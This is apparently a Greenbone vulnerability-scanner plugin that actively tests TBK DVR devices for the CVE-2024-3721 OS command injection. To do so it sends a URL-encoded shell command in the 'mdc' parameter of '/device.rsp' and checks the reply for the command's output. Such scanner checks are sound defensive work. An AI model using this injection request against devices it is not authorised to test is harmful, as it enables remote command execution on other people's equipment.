# SPDX-FileCopyrightText: 2024 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.152172");
  script_version("2024-05-08T05:05:32+0000");
  script_tag(name:"last_modification", value:"2024-05-08 05:05:32 +0000 (Wed, 08 May 2024)");
  script_tag(name:"creation_date", value:"2024-05-07 09:15:44 +0000 (Tue, 07 May 2024)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2024-3721");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TBK DVR devices OS Command Injection Vulnerability (Apr 2024) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2024 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 9000);
  script_exclude_keys("Settings/disable_cgi_scanning", "Host/runs_windows");

  script_tag(name:"summary", value:"TBK DVR devices are prone to an OS command injection
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"This issue affects some unknown processing of the file
  /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___. The manipulation of the argument mdb/mdc leads
  to OS command injection.");

  script_tag(name:"affected", value:"TBK DVR-4104 and DVR-4216 up to version 20240412 are affected.
  Other models/vendors might be as well affected.");

  script_tag(name:"solution", value:"Update to the latest firmware.");

  script_xref(name:"URL", value:"https://github.com/netsecfish/tbk_dvr_command_injection");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");
include("url_func.inc");

port = http_get_port(default: 9000);

url = "/login.rsp";

res = http_get_cache(port: port, item: url);

if (res !~ "^HTTP/1\.[01] 200")
  exit(0);

cmds = exploit_commands("linux");

headers = make_array("Cookie", "uid=1");

foreach pattern (keys(cmds)) {
  cmd = cmds[pattern] + ";";
  payload = urlencode(str: cmd);

  url = "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=" + payload;

  req = http_get_req(port: port, url: url, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req);

  if (result = egrep(pattern: pattern, string: res)) {
    report = "It was possible to execute the command '" + cmds[pattern] + "'" +
             '\n\nResult:\n\n' + result;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
